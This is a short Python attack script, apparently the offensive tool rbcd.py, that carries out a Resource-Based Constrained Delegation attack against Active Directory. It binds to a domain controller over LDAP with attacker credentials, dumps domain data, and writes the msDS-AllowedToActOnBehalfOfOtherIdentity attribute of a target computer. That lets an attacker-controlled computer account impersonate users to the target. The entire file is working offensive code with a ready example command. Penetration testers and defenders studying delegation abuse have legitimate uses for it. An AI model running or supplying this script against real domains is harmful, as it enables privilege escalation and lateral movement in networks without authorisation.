#!/usr/bin/env python3
#
# Resource-Based Constrained Delegation Attack:
#   - modify delegation rights on a target computer
#

import sys
import argparse
import ldap3
import ldapdomaindump
from impacket import version
from impacket import logging
from impacket.examples import logger
from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig

print(version.BANNER)

parser = argparse.ArgumentParser(add_help=True, description='Resource-Based Constrained Delegation Attack: allow an attacker controllable (preferably previously created fake) computer for delegation on a target computer (where the attacker has write access to properties through LDAP)')

parser.add_argument('-dc-ip', required=True, action='store', metavar='ip address', help='IP address of the Domain Controller')
parser.add_argument('-t', required=True, action='store', metavar='COMPUTERNAME', help='Target computer hostname where the attacker has write access to properties')
parser.add_argument('-f', required=True, action='store', metavar='COMPUTERNAME', help='(Fake) computer hostname which the attacker can control')
parser.add_argument('identity', action='store', help='domain\\username:password, attacker account with write access to target computer properties (NetBIOS domain name must be used!)')

if len(sys.argv) == 1:
    parser.print_help()
    print('\nExample: ./rbcd.py -dc-ip 10.10.10.1 -t WEB -f FAKECOMP ECORP\\test:Spring2020')
    sys.exit(1)

options = parser.parse_args()

attackeraccount = options.identity.split(':')
c = NTLMRelayxConfig()
c.addcomputer = options.f
c.target = options.dc_ip

logger.init()
logging.getLogger().setLevel(logging.INFO)
logging.info('Starting Resource Based Constrained Delegation Attack against {}$'.format(options.t))

logging.info('Initializing LDAP connection to {}'.format(options.dc_ip))
#tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
serv = ldap3.Server(options.dc_ip, tls=False, get_info=ldap3.ALL)
logging.info('Using {} account with password ***'.format(attackeraccount[0]))
conn = ldap3.Connection(serv, user=attackeraccount[0], password=attackeraccount[1], authentication=ldap3.SIMPLE)
conn.bind()
logging.info('LDAP bind OK')

logging.info('Initializing domainDumper()')
cnf = ldapdomaindump.domainDumpConfig()
cnf.basepath = c.lootdir
dd = ldapdomaindump.domainDumper(serv, conn, cnf)

logging.info('Initializing LDAPAttack()')
la = LDAPAttack(c, conn, attackeraccount[0].replace('\\', '/'))

logging.info('Writing SECURITY_DESCRIPTOR related to (fake) computer `{}` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `{}`'.format(options.f, options.t))
la.delegateAttack(options.f+'$', options.t+'$', dd, sid=None)

